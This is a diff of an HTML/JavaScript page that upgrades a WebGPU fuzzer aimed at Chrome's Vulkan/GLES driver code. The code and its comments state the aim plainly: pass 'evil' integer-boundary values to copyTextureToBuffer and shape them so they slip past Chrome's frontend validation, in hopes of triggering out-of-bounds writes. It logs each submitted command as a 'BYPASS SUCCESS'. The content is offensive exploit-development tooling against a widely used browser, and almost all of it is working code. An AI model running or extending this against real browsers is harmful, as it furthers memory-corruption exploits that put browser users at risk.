@@ -1,61 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Texture Math Fuzzer</title>
-    <style>body { background: #111; color: #0f0; font-family: monospace; }</style>
+    <title>WebGPU 32-bit Downcast Fuzzer</title>
+    <style>body { background: #000; color: #0f0; font-family: monospace; font-size: 14px; }</style>
 </head>
 <body>
-    <h2>Attacking copyTextureToBuffer Math</h2>
-    <button id="fuzzBtn" style="padding:10px; background:#f00; color:#fff; font-weight:bold;">FUZZ TEXTURE MATH</button>
-    <pre id="log"></pre>
+    <h2>Attacking Chrome Vulkan/GLES Driver Math</h2>
+    <button id="fuzzBtn" style="padding:15px; background:#f00; color:#fff; font-weight:bold; cursor:pointer;">START V2 FUZZER</button>
+    <pre id="log" style="white-space: pre-wrap; word-wrap: break-word;"></pre>
 
     <script>
         const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText; }
+        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText.substring(0, 2000); }
 
-        // Array of "evil" integers designed to cause overflows
-        const poisonValues = [
-            0, 1, 2, 255, 256, 
-            0x7FFFFFFF, 0x80000000, // 32-bit max
-            0xFFFFFFFF, 0xFFFFFFFE, // 32-bit unsigned max
-            0x100000000,            // 32-bit overflow boundary
-            4294967295, 4294967296  // JS Number boundaries
+        // Highly targeted integer boundaries to trigger 32-bit driver overflows
+        const baseValues = [
+            1, 2, 4, 8, 
+            65536, 65535,           // 16-bit boundaries
+            2147483647, 2147483648, // 32-bit signed boundaries
+            4294967295, 4294967296, // 32-bit unsigned boundaries
+            0xFFFFFF, 0x10000000,
+            1048576                 // 1MB
         ];
 
         function getPoison() {
-            return poisonValues[Math.floor(Math.random() * poisonValues.length)];
+            // Randomly select a base value and occasionally mutate it slightly
+            let val = baseValues[Math.floor(Math.random() * baseValues.length)];
+            if (Math.random() > 0.5) val += Math.floor(Math.random() * 10);
+            if (Math.random() > 0.5) val -= Math.floor(Math.random() * 10);
+            return Math.abs(val); // Keep it positive
         }
 
         async function runFuzzer() {
+            if (!navigator.gpu) {
+                log("WebGPU not supported!");
+                return;
+            }
+
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
-            log("Device acquired. Starting 3D Texture OOB Fuzzer...");
+            log("[+] WebGPU Device acquired. Starting targeted dimension fuzzing...");
 
+            // Create a valid buffer to act as the sink
             const buffer = device.createBuffer({
-                size: 1024 * 1024 * 4, // 4MB valid buffer
+                size: 1024 * 1024 * 16, // 16 MB buffer
                 usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ
             });
 
+            // Create a valid texture to act as the source
+            // Note: Fixed the GPUTextureUsage typo!
             const texture = device.createTexture({
-                size: { width: 4, height: 4, depthOrArrayLayers: 2 },
+                size: { width: 4, height: 4, depthOrArrayLayers: 4 },
                 format: 'rgba8unorm',
-                usage: GPUBufferUsage.COPY_SRC | GPUBufferUsage.RENDER_ATTACHMENT
+                usage: GPUTextureUsage.COPY_SRC | GPUTextureUsage.RENDER_ATTACHMENT
             });
 
             let runs = 0;
 
+            // Attack loop
             setInterval(() => {
                 runs++;
-                if(runs % 50 === 0) log(`[+] Executed ${runs} copy attempts...`);
+                if(runs % 50 === 0) log(`[+] Executed ${runs} malicious copy commands...`);
 
                 const encoder = device.createCommandEncoder();
 
-                // Generate malicious copy dimensions
-                // We want to trick the engine into thinking the copy is small, 
-                // but the internal math wraps around and writes OOB.
-                const evilBytesPerRow = getPoison();
-                const evilRowsPerImage = getPoison();
-                const evilDepth = getPoison();
+                // 1. Generate bytesPerRow and FORCE it to be a multiple of 256 to bypass Chrome's validation
+                let evilBytesPerRow = getPoison();
+                evilBytesPerRow = (evilBytesPerRow & ~0xFF) >>> 0; // Bitwise mask: guarantees multiple of 256
+                if (evilBytesPerRow === 0) evilBytesPerRow = 256;  // Must be >= 256
+
+                // 2. Generate other dimensions
+                let evilRowsPerImage = getPoison();
+                let evilDepth = getPoison() % 2048; // Keep depth somewhat reasonable to bypass early checks
 
                 try {
                     encoder.copyTextureToBuffer(
@@ -65,17 +81,24 @@
                             bytesPerRow: evilBytesPerRow, 
                             rowsPerImage: evilRowsPerImage 
                         },
-                        { width: 4, height: 4, depthOrArrayLayers: evilDepth }
+                        { 
+                            width: 4, 
+                            height: 4, 
+                            depthOrArrayLayers: evilDepth 
+                        }
                     );
 
-                    // If we reach here, the C++ bounds check FAILED to catch our bad math!
-                    device.queue.submit([encoder.finish()]);
-                    log(`[!] CRITICAL: Bypassed bounds check with bpr:${evilBytesPerRow}, rpi:${evilRowsPerImage}, depth:${evilDepth}`);
+                    const cmdBuf = encoder.finish();
+                    device.queue.submit([cmdBuf]);
+                    
+                    // If the script prints this, we successfully bypassed Chrome's frontend validation!
+                    log(`[!] BYPASS SUCCESS: Sent to Driver! BPR:${evilBytesPerRow}, RPI:${evilRowsPerImage}, Depth:${evilDepth}`);
 
                 } catch (e) {
-                    // Normal behavior: WebGPU threw a validation error
+                    // Chrome caught the overflow before the driver did.
+                    // We swallow the error and instantly try the next combination.
                 }
-            }, 5); 
+            }, 5); // Run super fast
         }
 
         document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
